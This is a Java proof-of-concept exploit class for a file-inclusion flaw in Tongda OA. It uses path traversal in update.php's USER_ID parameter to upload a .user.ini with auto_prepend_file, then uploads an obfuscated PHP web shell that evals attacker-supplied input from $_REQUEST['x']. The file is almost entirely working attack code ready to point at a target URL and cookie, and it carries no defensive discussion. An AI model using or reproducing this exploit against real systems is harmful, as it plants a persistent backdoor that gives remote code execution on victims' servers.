package poc;

import com.github.kevinsawicki.http.HttpRequest;

public class TongdaOA_Attachment_Remark_FileInclude {
    private String url;//通达OAurl
    private String path;//漏洞目录path
    private String cookie;//cookie
    private String fileName;//文件名
    private String payload="<?php class Gz5SfY10 { public function __construct($H7Es8){ @eval(\"/*Z7y11Eib8N*/\".$H7Es8.\"\"); }}new Gz5SfY10($_REQUEST['x']);?>";//文件内容

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getCookie() {
        return cookie;
    }

    public void setCookie(String cookie) {
        this.cookie = cookie;
    }

    public String getFileName() {
        return fileName;
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public String getPayload() {
        return payload;
    }

    public void setPayload(String payload) {
        this.payload = payload;
    }
    

    //通达OAattachement_remark文件包含漏洞poc
    public boolean POC(){
        //上传.user.ini文件
        path="/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user";
        HttpRequest iniRequest = HttpRequest.post(url + path)
                .trustAllHosts()
                .trustAllCerts()
                .header("Cookie", cookie)
                .part("ATTACHMENT", "config.ini", "auto_prepend_file=tongda.log")
                .part("submit", "保存");
         if (iniRequest.code()==200){
             path="/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/tongda";
             HttpRequest uploadRequest = HttpRequest.post(url + path)
                     .trustAllHosts()
                     .trustAllCerts()
                     .header("Cookie", cookie)
                     .part("ATTACHMENT", "tongda.log", payload)
                     .part("submit", "保存");
             if (uploadRequest.code()==200){
                 path="/general/reportshop/workshop/report/attachment-remark/form.inc.php?tongda";
                 return true;
             }else {
                 return false;
             }
         }else {
             System.out.println(1);
             return false;
         }
    }
}
